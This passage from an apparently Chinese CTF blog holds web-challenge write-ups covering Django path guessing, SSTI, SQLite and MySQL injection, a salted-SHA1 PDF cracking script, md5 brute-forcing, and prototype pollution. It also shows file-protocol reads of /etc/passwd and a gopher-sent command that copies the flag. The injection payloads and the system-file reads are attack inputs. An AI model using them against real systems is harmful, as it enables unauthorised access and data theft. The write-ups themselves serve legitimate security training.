title=\"宽字节测试\"></a>宽字节测试</h3><ul>\n<li>用<code>%bf</code>试一下，发现报错了。首先发现是django框架，且说明后端用的是gbk编码，超过%F7的在gbk中不再有意义</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/28.png\" alt=\"c67deb0358a6a6b65703381d8c33ff6.png\"></p>\n<ul>\n<li>接着根据报错信息，可以猜项目的路径是<code>/opt/api</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/29.png\" alt=\"image.png\"></p>\n<h3 id=\"django的特殊知识\"><a href=\"#django的特殊知识\" class=\"headerlink\" title=\"django的特殊知识\"></a>django的特殊知识</h3><ul>\n<li>django项目下一般有个settings.py文件是设置网站数据库路径。</li>\n<li>接着就是猜<code>settings.py</code>的路径，我自己照着wp做的时候，猜是</li>\n</ul>\n<p><code>url=@/opt/api/dnsapi/settings.py</code>,但是没反应</p>\n<ul>\n<li>那就猜<code>url=@/opt/api/api/settings.py</code></li>\n<li>全局搜索<code>sqlite</code>，发现了疑似的数据库路径</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/30.png\" alt=\"image.png\"></p>\n<ul>\n<li>访问<code>url=@/opt/api/database.sqlite3</code>,全局搜索ctf</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/31.png\" alt=\"image.png\"><br><strong>以下来自chatgpt：</strong></p>\n<ul>\n<li><p>Django 项目的 settings.py 文件通常位于项目根目录下，与项目的主要 Python 包（通常是包含 wsgi.py 文件的包）处于同一级别。</p>\n</li>\n<li><p>假设你的 Django 项目的根目录名为 myproject，那么 settings.py 文件的路径应该是：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">/</span>myproject<span class=\"token operator\">/</span>myproject<span class=\"token operator\">/</span>settings<span class=\"token punctuation\">.</span>py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>第一个 myproject 是项目的根目录，第二个 myproject 是包含 settings.py 文件的 Python 包的名称。如果你的项目名称不同，那么路径中的 myproject 部分应该替换为你的项目名称。</p>\n</li>\n</ul>\n<h2 id=\"总结-4\"><a href=\"#总结-4\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>框架的漏洞我还需要多总结</li>\n<li>大致思路一般都是找配置文件，找日志，找数据库</li>\n<li>之后把遇到的都总结一下</li>\n</ul>\n<h1 id=\"攻防世界-Confusion1-难度4-SSTI\"><a href=\"#攻防世界-Confusion1-难度4-SSTI\" class=\"headerlink\" title=\"攻防世界 Confusion1(难度4) SSTI\"></a>攻防世界 Confusion1(难度4) SSTI</h1><h2 id=\"思路-8\"><a href=\"#思路-8\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题我之前做过，所以有点印象，看这个图和python有关，所以想到SSTI</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/32.png\" alt=\"image.png\"></p>\n<ul>\n<li>但是我始终没有找到入口，在哪输入，其实我也测试了<code>/&#123;&#123;7*7&#125;&#125;</code>,但是我没有仔细看回显，其实在404的报错页面是有回显的</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/33.png\" alt=\"image.png\"></p>\n<ul>\n<li>就差一点！！！！我好气</li>\n<li>然后就直接上payload就行了</li>\n</ul>\n<h2 id=\"总结-5\"><a href=\"#总结-5\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>一定要多看回显的信息，多看包！！！</li>\n</ul>\n<h1 id=\"攻防世界-FlatScience-难度4-SQlite注入\"><a href=\"#攻防世界-FlatScience-难度4-SQlite注入\" class=\"headerlink\" title=\"攻防世界 FlatScience(难度4)SQlite注入\"></a>攻防世界 FlatScience(难度4)SQlite注入</h1><h2 id=\"思路-9\"><a href=\"#思路-9\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题也是之前做过有点印象</li>\n<li>需要先扫一下目录，扫出来有<code>login.php</code>和<code>admin.php</code></li>\n<li>测试一下，发现<code>login.php</code>界面可以sql注入</li>\n<li>但是数据库是<code>sqlite</code>不是<code>mysql</code></li>\n<li>我测试的时候一直不行，因为没有<strong>仔细看包的回显信息</strong>，一定要记住这个！！</li>\n</ul>\n<h2 id=\"wp-9\"><a href=\"#wp-9\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>注入测试之后，发现提示<code>admin.php</code>的密码在pdf文件中。</li>\n<li>这里需要查看源码，发现<code>sha1</code>加密</li>\n<li>用<code>wget</code>下载所有pdf</li>\n<li>写脚本提取每一个单词，判断单词的<code>Sha1</code>是否和数据库中的相等从而找到密码</li>\n</ul>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> PyPDF2\n<span class=\"token keyword\">import</span> nltk\n<span class=\"token keyword\">from</span> nltk<span class=\"token punctuation\">.</span>tokenize <span class=\"token keyword\">import</span> word_tokenize\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> glob\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_words</span><span class=\"token punctuation\">(</span>pdf_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token comment\"># 创建PyPDF2的PdfFileReader对象</span>\n    pdf_reader <span class=\"token operator\">=</span> PyPDF2<span class=\"token punctuation\">.</span>PdfFileReader<span class=\"token punctuation\">(</span>pdf_file<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># 获取PDF文件中的所有页面数量</span>\n    num_pages <span class=\"token operator\">=</span> pdf_reader<span class=\"token punctuation\">.</span>getNumPages<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># 创建一个空字符串，用于存储PDF文件中的所有文本zl</span>\n    pdf_text <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n    <span class=\"token comment\"># 循环遍历PDF文件中的每一页，并将内容添加到pdf_text中</span>\n    <span class=\"token keyword\">for</span> page <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>num_pages<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        page_obj <span class=\"token operator\">=</span> pdf_reader<span class=\"token punctuation\">.</span>getPage<span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">)</span>\n        pdf_text <span class=\"token operator\">+=</span> page_obj<span class=\"token punctuation\">.</span>extractText<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token comment\"># 使用nltk库的word_tokenize函数将pdf_text中的文本拆分为单词</span>\n        words <span class=\"token operator\">=</span> word_tokenize<span class=\"token punctuation\">(</span>pdf_text<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">for</span> word <span class=\"token keyword\">in</span> words<span class=\"token punctuation\">:</span>\n            sha1 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            salt_word <span class=\"token operator\">=</span> word <span class=\"token operator\">+</span> <span class=\"token string\">\"Salz!\"</span>\n            sha1<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>salt_word<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            encoded_text <span class=\"token operator\">=</span> sha1<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>encoded_text <span class=\"token operator\">==</span> <span class=\"token string\">'3fab54a50e770d830c0416df817567662a9dc85c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> word\n    <span class=\"token keyword\">return</span> \n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    current_dir <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># 构造一个搜索所有PDF文件的通配符</span>\n    pdf_glob <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>current_dir<span class=\"token punctuation\">,</span> <span class=\"token string\">'*.pdf'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># 使用glob.glob函数获取所有PDF文件的文件名列表</span>\n    pdf_files <span class=\"token operator\">=</span> glob<span class=\"token punctuation\">.</span>glob<span class=\"token punctuation\">(</span>pdf_glob<span class=\"token punctuation\">)</span>\n\n\n    <span class=\"token keyword\">for</span> pdf_file <span class=\"token keyword\">in</span> pdf_files<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 打印PDF文件名</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_words<span class=\"token punctuation\">(</span>pdf_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"总结-6\"><a href=\"#总结-6\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>看源码</li>\n<li>看包</li>\n</ul>\n<h1 id=\"攻防世界-md5爆破-file协议读\"><a href=\"#攻防世界-md5爆破-file协议读\" class=\"headerlink\" title=\"攻防世界 md5爆破+file协议读\"></a>攻防世界 md5爆破+file协议读</h1><h2 id=\"思路-10\"><a href=\"#思路-10\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>上来发现这里需要验证码，我猜到是爆破，但是我没尝试</li>\n<li>太可惜了，应该尝试一下的</li>\n</ul>\n<h2 id=\"wp-10\"><a href=\"#wp-10\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>python写个多线程的脚本爆破，有三种方法</li>\n</ul>\n<p><strong>方法1：</strong></p>\n<ul>\n<li><p>这里最开始，我想按照之前那种多线程的方式写</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">with</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>ThreadPoolExecutor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> executor<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        executor<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>test_char<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>但是代码在循环中生成大量的任务，并将它们提交给线程池，此时会导致内存占用过多，容易卡死</p>\n</li>\n</ul>\n<p><strong>方法2：</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> max_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>使用了一个简单的列表推导式（List Comprehension）来生成任务列表，这种方式会一次性生成所有的任务，可能会导致内存占用过高。</li>\n</ul>\n<p><strong>方法3：</strong></p>\n<ul>\n<li><p>下面这个使用生成器动态生成，一次只生成一个任务，可以节约内存。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">max_num <span class=\"token operator\">=</span> <span class=\"token number\">100000</span>\n    <span class=\"token keyword\">with</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>ThreadPoolExecutor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> executor<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 使用生成器动态生成任务</span>\n        tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> max_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># 使用 map 方法并发执行任务</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> executor<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>find_char<span class=\"token punctuation\">,</span> tasks<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>这将生成一个生成器对象，它可以通过迭代器协议（Iterator Protocol）来逐个生成任务。在 ThreadPoolExecutor.map() 方法中，当生成器生成新的任务时，线程池会自动将任务提交给线程池进行执行，直到生成器生成的所有任务都执行完毕。</p>\n</li>\n<li><p><strong>并发是指多个任务在同一时间段内交替执行</strong></p>\n</li>\n</ul>\n<p>完整代码：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> concurrent<span class=\"token punctuation\">.</span>futures\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">find_char</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    md5 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    md5<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    encode_string <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>encode_string<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"359475\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">#4be21a</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    max_num <span class=\"token operator\">=</span> <span class=\"token number\">100000</span>\n    <span class=\"token keyword\">with</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>ThreadPoolExecutor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> executor<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 使用生成器动态生成任务</span>\n        tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> max_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># 使用 map 方法并发执行任务</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> executor<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>find_char<span class=\"token punctuation\">,</span> tasks<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>由于不需要使用迭代器中的元素，只需要并发地执行任务，因此使用一个下划线 _ 来占位，并在循环中使用 pass 语句来跳过迭代器中的元素。<strong>也就是</strong><code>**find_char**</code><strong>函数没有返回值</strong></p>\n</li>\n<li><p>如果有返回值的话，按照这么写</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> result <span class=\"token keyword\">in</span> executor<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>find_char<span class=\"token punctuation\">,</span> tasks<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>此时用<code>file</code>访问&#x2F;etc&#x2F;passwd，发现有回显</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/34.png\" alt=\"image.png\"></p>\n<ul>\n<li>访问<code>file:///flag</code>，但是提示<code>hack</code></li>\n<li>对<code>flag</code>进行url编码(all-characters)，是可以获得flag的</li>\n</ul>\n<h3 id=\"apache配置文件\"><a href=\"#apache配置文件\" class=\"headerlink\" title=\"apache配置文件\"></a>apache配置文件</h3><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>**&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf **是 Apache Web服务器的配置文件之一，它通常用于指定默认的虚拟主机和网站配置。在Debian和Ubuntu系统中，Apache的默认虚拟主机配置文件通常被存储在此目录下，以便系统管理员可以轻松地添加、编辑或删除虚拟主机。<br>虚拟主机是一种机制，允许在同一物理服务器上托管多个网站，每个网站都可以拥有自己的域名、IP地址、文档根目录和配置。<br>**000-default.conf **是默认的虚拟主机配置文件名称，它通常包含一些基本的网站配置，例如文档根目录、错误日志位置、访问日志格式等等。系统管理员可以通过编辑该文件来更改默认的网站配置，或添加新的虚拟主机配置。</p>\n</p>\n</div>\n<ul>\n<li>这里发现有个<code>47852</code>端口，访问它的网站默认页面<code>index.php</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/35.png\" alt=\"image.png\"><br><img src=\"/../CTF-web-wp/36.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里有命令执行，用<code>gopher</code>发送Post包，将<code>cat /f* &gt; /1</code>，读取文件</li>\n</ul>\n<p>提示：<code>file:///f*</code>这样是不可以的，只有命令执行语句才可以用通配符</p>\n<h3 id=\"url二次编码绕过对flag的过滤\"><a href=\"#url二次编码绕过对flag的过滤\" class=\"headerlink\" title=\"url二次编码绕过对flag的过滤\"></a>url二次编码绕过对flag的过滤</h3><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p>我发现一个神奇的事情</p>\n<ul>\n<li><p>用Hackbar、burpsuite就需要二次编码，符合我想的逻辑</p>\n</li>\n<li><p>但是直接在框里提交就一次编码就行了。</p>\n</div>\n</li>\n<li><p>看源码发现用<code>pref_match</code>在当前页面过滤了flag，但是我没看到源码</p>\n</li>\n<li><p>如果对<code>flag</code>进行二次编码，相当于php解析了一次，但是没有找到flag，所以绕过了</p>\n</li>\n<li><p>但是file协议是可以读url编码后的<code>flag</code>的</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/37.png\" alt=\"image.png\"></p>\n<h1 id=\"攻防世界-warmup-难度4-sql注入-别名\"><a href=\"#攻防世界-warmup-难度4-sql注入-别名\" class=\"headerlink\" title=\"攻防世界 warmup(难度4) sql注入-别名\"></a>攻防世界 warmup(难度4) sql注入-别名</h1><h2 id=\"思路-11\"><a href=\"#思路-11\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题给了源码，我看了半天，发现禁用了许多字符，我以为就没有办法了</li>\n<li>但是其实禁用的字符里面没有单引号，这里发现会对输入的字符进行转义</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/38.png\" alt=\"image.png\"></p>\n<h2 id=\"wp-11\"><a href=\"#wp-11\" class=\"headerlink\" title=\"wp\"></a>wp</h2><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">\"select username,password from \"</span><span class=\"token punctuation\">.</span>$this<span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token keyword\">table</span><span class=\"token punctuation\">.</span><span class=\"token string\">\" where username='\"</span><span class=\"token punctuation\">.</span>$this<span class=\"token operator\">-</span><span class=\"token operator\">></span>username<span class=\"token punctuation\">.</span><span class=\"token string\">\"' and password='\"</span><span class=\"token punctuation\">.</span>$this<span class=\"token operator\">-</span><span class=\"token operator\">></span>password<span class=\"token punctuation\">.</span>\"'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>其实就是绕过这个，可以直接用万能密码绕过的</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/39.png\" alt=\"image.png\"></p>\n<ul>\n<li>由于上面这里是查admin的密码是不是输对了，也学到了一个新的方式，用别名绕过，在table处，用select 构造一个表构造admin的密码是123,然后在username处输入<code>admin</code>，password处输入<code>123</code>就可以了<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token string\">'admin'</span> username<span class=\"token punctuation\">,</span><span class=\"token string\">'123'</span> password<span class=\"token punctuation\">)</span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h1 id=\"攻防世界-BadProgrammer-难度5-原型链污染\"><a href=\"#攻防世界-BadProgrammer-难度5-原型链污染\" class=\"headerlink\" title=\"攻防世界 BadProgrammer(难度5)原型链污染\"></a>攻防世界 BadProgrammer(难度5)原型链污染</h1><h2 id=\"思路-12\"><a href=\"#思路-12\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题也是没什么发现，直接看wp</li>\n</ul>\n<h2 id=\"wp-12\"><a href=\"#wp-12\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>dirsearch扫目录，发现<code>/static../</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/40.png\" alt=\"image.png\"></p>\n<ul>\n<li>看<code>package.json</code>有安装了什么包的信息</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/41.png\" alt=\"image.png\"></p>\n<ul>\n<li>也就是说这个<code>express-fileupload</code>可能有问题，直接百度查<code>exp</code></li>\n<li>查看<code>app.js</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/42.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里发现一个可以<code>post</code>提交的地方</li>\n<li>用脚本post提交，将flag复制到可以查看的地方，<code>package.json</code>中发现项目的路径是<code>/app</code></li>\n</ul>\n<h1 id=\"ctfshow-web681-sql注入-转义\"><a href=\"#ctfshow-web681-sql注入-转义\" class=\"headerlink\" title=\"ctfshow web681 sql注入-\\转义\"></a>ctfshow web681 sql注入-\\转义</h1><h2 id=\"思路-13\"><a href=\"#思路-13\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>burp抓包，发现有查询</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/43.png\" alt=\"image.png\"></p>\n<ul>\n<li>但是输入单引号显示不了，猜测后端可能把单引号置为空字符串””</li>\n<li>也过滤了空格</li>\n<li>这里我想了半天，不能闭合怎么办，也没想出来</li>\n</ul>\n<h2 id=\"wp-13\"><a href=\"#wp-13\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li><p>用单引号把原来查询语句中的单引号转义</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> ctfshow_users <span class=\"token keyword\">where</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'$username'</span> <span class=\"token operator\">or</span> nickname <span class=\"token operator\">=</span> <span class=\"token string\">'$username'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>这里我输入<code>aaa\\</code>，就变成了红色部分是username的查询参数</p>\n</li>\n</ul>\n<p><code>username=&#39;**aaa\\&#39; or nickname =**&#39;aaa\\&#39;</code></p>\n<ul>\n<li>所以我把aaa改成or指定查询，此时第一个<code>#</code>由于在单引号内，被当作字符，第二个<code>#</code>被当成注释</li>\n</ul>\n<p><code>username=&#39;**aaa\\#&#39; or nickname =**&#39;/**/or(1)#\\&#39;</code></p>\n<h2 id=\"总结-7\"><a href=\"#总结-7\" class=\"headerlink\" 